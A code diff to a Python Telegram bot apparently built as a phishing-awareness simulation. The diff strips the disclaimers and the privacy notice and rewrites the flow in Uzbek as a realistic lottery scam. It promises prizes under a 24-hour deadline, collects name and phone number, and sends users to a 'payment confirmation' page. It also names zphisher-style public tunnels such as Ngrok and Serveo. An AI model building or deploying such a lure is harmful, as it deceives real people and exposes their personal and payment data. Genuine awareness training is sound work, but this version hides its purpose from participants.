@@ -1,6 +1,6 @@
 """
-Bot message handlers for the educational training flow.
-Collects name/phone only in memory — passed via URL fragment, never stored server-side.
+Bot message handlers — realistic scam flow until final reveal.
+Educational disclaimer shown ONLY after web simulation completes.
 """
 
 import logging
@@ -15,7 +15,6 @@ from bot.keyboards import (
     continue_simulation_keyboard,
     phone_request_keyboard,
     remove_keyboard,
-    restart_keyboard,
 )
 from bot.services.api_client import create_training_session, fetch_tunnel_status
 from bot.states import TrainingFlow
@@ -24,45 +23,31 @@ logger = logging.getLogger(__name__)
 router = Router()
 
 SCAM_WELCOME = """
-🎉 <b>Congratulations!</b> 🎉
+🎉 <b>Tabriklaymiz!</b> 🎉
 
-You have been selected for a chance to win one of the following prizes:
+Siz quyidagi sovrinlardan birini yutib olish imkoniyatiga ega bo'ldingiz:
 
 🚗 <b>BYD Champion</b>
 📱 <b>iPhone 17</b>
-💰 <b>5,000,000 UZS</b>
-🏠 <b>Apartment</b>
-🚙 <b>Luxury Car</b>
+💰 <b>5 000 000 UZS</b>
+🏠 <b>Kvartira</b>
+🚙 <b>Hashtabshar avtomobil</b>
 
-<i>⚠️ EDUCATIONAL SIMULATION — This message intentionally resembles common online scam patterns for cybersecurity awareness training.</i>
+⏰ <b>Mukofotni olish uchun 24 soat ichida ro'yxatdan o'ting!</b>
 
-To continue the <b>awareness simulation</b>, please provide:
+Ro'yxatdan o'tish uchun ma'lumotlaringizni kiriting.
 
-👤 Your <b>Full Name</b>
-"""
-
-PRIVACY_NOTICE = """
-🔒 <b>Privacy Notice (Educational Simulation)</b>
-
-The information you provide is used <b>only within this training simulation</b> and is <b>NOT stored</b> on any server.
-
-Your name will appear only on your local training certificate.
+👤 <b>To'liq ismingiz</b>
 """
 
 ABOUT_TEXT = """
 🛡️ <b>Cyber Hygiene Awareness Training</b>
 
-This Telegram bot is part of an <b>educational cybersecurity simulation</b>.
+Bu bot <b>ta'lim simulyatsiyasi</b> uchun mo'ljallangan.
 
-You will experience a realistic scam scenario to learn how to recognize:
-• Fake lottery messages
-• Phishing websites
-• Payment card traps
-• SMS/OTP theft
+Ishtirochilar uchun simulyatsiya real ko'rinadi — ogohlantirish faqat oxirida chiqadi.
 
-<b>No real data is collected or transmitted.</b>
-
-Use /start to begin the training.
+<b>Haqiqiy ma'lumotlar yig'ilmaydi.</b>
 """
 
 
@@ -70,8 +55,7 @@ Use /start to begin the training.
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
     await message.answer(SCAM_WELCOME)
-    await message.answer(PRIVACY_NOTICE)
-    await message.answer("Please enter your <b>Full Name</b>:")
+    await message.answer("Iltimos, <b>to'liq ismingizni</b> kiriting:")
     await state.set_state(TrainingFlow.waiting_for_name)
 
 
@@ -82,12 +66,11 @@ async def cmd_about(message: Message):
 
 @router.message(Command("status"))
 async def cmd_status(message: Message):
-    """Show tunnel URL and platform status for training instructors."""
+    """Instructor: tunnel and platform status."""
     status = await fetch_tunnel_status()
     if not status:
         await message.answer(
             "⚠️ <b>Backend ulanmagan</b>\n\n"
-            "Avval platformani ishga tushiring:\n"
             "<code>bash scripts/start-training.sh</code>"
         )
         return
@@ -97,43 +80,28 @@ async def cmd_status(message: Message):
     active = "✅ Faol" if status.get("active") else "📍 Mahalliy"
 
     await message.answer(
-        "📡 <b>Platforma holati</b>\n\n"
-        f"🌐 <b>Ommaviy havola:</b>\n<code>{public}</code>\n\n"
+        "📡 <b>Platforma holati (instruktor)</b>\n\n"
+        f"🌐 <b>Havola:</b>\n<code>{public}</code>\n\n"
         f"🔗 <b>Tunnel:</b> {tunnel_type}\n"
         f"📶 <b>Status:</b> {active}\n\n"
-        f"🏠 <b>Mahalliy:</b> <code>{status.get('local_url', 'http://127.0.0.1:8000')}</code>\n\n"
-        "<i>⚠️ Ta'lim simulyatsiyasi — ishtirokchilarga bot orqali /start yuboring.</i>"
+        f"🏠 <code>{status.get('local_url', 'http://127.0.0.1:8000')}</code>"
     )
 
 
 @router.message(Command("tunnel"))
 async def cmd_tunnel(message: Message):
     await message.answer(
-        "🔧 <b>Tunnel sozlash (zphisher usulida)</b>\n\n"
-        "Internetdan kirish uchun platformani tunnel bilan ishga tushiring:\n\n"
+        "🔧 <b>Tunnel (instruktor)</b>\n\n"
         "<code>bash scripts/start-training.sh</code>\n\n"
-        "Tanlovlar:\n"
-        "1️⃣ LocalHost (Wi-Fi)\n"
-        "2️⃣ Ngrok\n"
-        "3️⃣ Serveo\n"
-        "4️⃣ Localhost.run\n\n"
-        "Tunnel ishga tushgach, <code>/status</code> buyrug'i bilan havolani ko'ring.\n\n"
-        "<i>Faqat ta'lim maqsadida — phishing qanday ishlashini ko'rsatish uchun.</i>"
+        "1️⃣ LocalHost\n2️⃣ Ngrok\n3️⃣ Serveo\n4️⃣ Localhost.run"
     )
-
-
-@router.callback_query(F.data == "about_training")
-async def callback_about(callback: CallbackQuery):
-    await callback.message.answer(ABOUT_TEXT)
-    await callback.answer()
 
 
 @router.callback_query(F.data == "restart")
 async def callback_restart(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.message.answer(SCAM_WELCOME)
-    await callback.message.answer(PRIVACY_NOTICE)
-    await callback.message.answer("Please enter your <b>Full Name</b>:")
+    await callback.message.answer("Iltimos, <b>to'liq ismingizni</b> kiriting:")
     await state.set_state(TrainingFlow.waiting_for_name)
     await callback.answer()
 
@@ -142,13 +110,13 @@ async def callback_restart(callback: CallbackQuery, state: FSMContext):
 async def process_name(message: Message, state: FSMContext):
     name = (message.text or "").strip()
     if len(name) < 2 or len(name) > 100:
-        await message.answer("Please enter a valid full name (2–100 characters):")
+        await message.answer("Iltimos, to'g'ri ism kiriting (kamida 2 harf):")
         return
     await state.update_data(display_name=name)
     await message.answer(
-        f"Thank you, <b>{name}</b>!\n\n"
-        "Now please provide your <b>Phone Number</b> for the simulation.\n\n"
-        "<i>Remember: this is NOT stored on any server.</i>",
+        f"Rahmat, <b>{name}</b>!\n\n"
+        "Endi <b>telefon raqamingizni</b> kiriting — mukofot shu raqamga bog'lanadi.\n\n"
+        "📱 Quyidagi tugmadan foydalaning yoki qo'lda yozing.",
         reply_markup=phone_request_keyboard(),
     )
     await state.set_state(TrainingFlow.waiting_for_phone)
@@ -160,10 +128,10 @@ async def process_phone_contact(message: Message, state: FSMContext):
     await _finish_registration(message, state, phone)
 
 
-@router.message(TrainingFlow.waiting_for_phone, F.text == "✏️ Type Phone Manually")
+@router.message(TrainingFlow.waiting_for_phone, F.text == "✏️ Raqamni qo'lda yozish")
 async def process_phone_manual_prompt(message: Message):
     await message.answer(
-        "Please type your phone number (simulation only):",
+        "Telefon raqamingizni kiriting:",
         reply_markup=remove_keyboard(),
     )
 
@@ -172,20 +140,20 @@ async def process_phone_manual_prompt(message: Message):
 async def process_phone_text(message: Message, state: FSMContext):
     phone = (message.text or "").strip()
     if len(phone) < 5:
-        await message.answer("Please enter a valid phone number:")
+        await message.answer("Iltimos, to'g'ri telefon raqam kiriting:")
         return
     await _finish_registration(message, state, phone)
 
 
 async def _finish_registration(message: Message, state: FSMContext, phone: str):
     data = await state.get_data()
-    name = data.get("display_name", "Trainee")
+    name = data.get("display_name", "Ishtirokchi")
     user_id = message.from_user.id if message.from_user else 0
 
     session_data = await create_training_session(user_id)
     if not session_data:
         await message.answer(
-            "⚠️ Training server is temporarily unavailable. Please try again later with /start",
+            "⚠️ Server vaqtincha ishlamayapti. Keyinroq /start buyrug'ini yuboring.",
             reply_markup=remove_keyboard(),
         )
         await state.clear()
@@ -193,20 +161,19 @@ async def _finish_registration(message: Message, state: FSMContext, phone: str):
 
     token = session_data["token"]
     base_url = session_data["simulation_url"].split("?")[0]
-
-    # PII passed via URL fragment — never sent to server, only stored in browser sessionStorage
     fragment = f"name={quote(name)}&phone={quote(phone)}"
     simulation_url = f"{base_url}?token={token}#{fragment}"
 
     await message.answer(
-        "✅ <b>Registration Complete (Simulation)</b>\n\n"
-        "You are now ready to continue the cybersecurity awareness training.\n\n"
-        "Click the button below to open the <b>simulated lottery website</b>.\n\n"
-        "⚠️ <i>This is an educational simulation. No real prizes exist.</i>",
+        "✅ <b>Ro'yxatdan o'tish muvaffaqiyatli yakunlandi!</b>\n\n"
+        f"Hurmatli <b>{name}</b>, sizning arizangiz qabul qilindi.\n\n"
+        "Mukofotingizni olish uchun quyidagi tugmani bosing va "
+        "to'lovni tasdiqlash sahifasiga o'ting.\n\n"
+        "⏰ <b>Diqqat:</b> vaqt cheklangan — tezroq harakat qiling!",
         reply_markup=remove_keyboard(),
     )
     await message.answer(
-        "👇 Press to continue:",
+        "👇 Mukofotni olish uchun bosing:",
         reply_markup=continue_simulation_keyboard(simulation_url),
     )
     await state.clear()
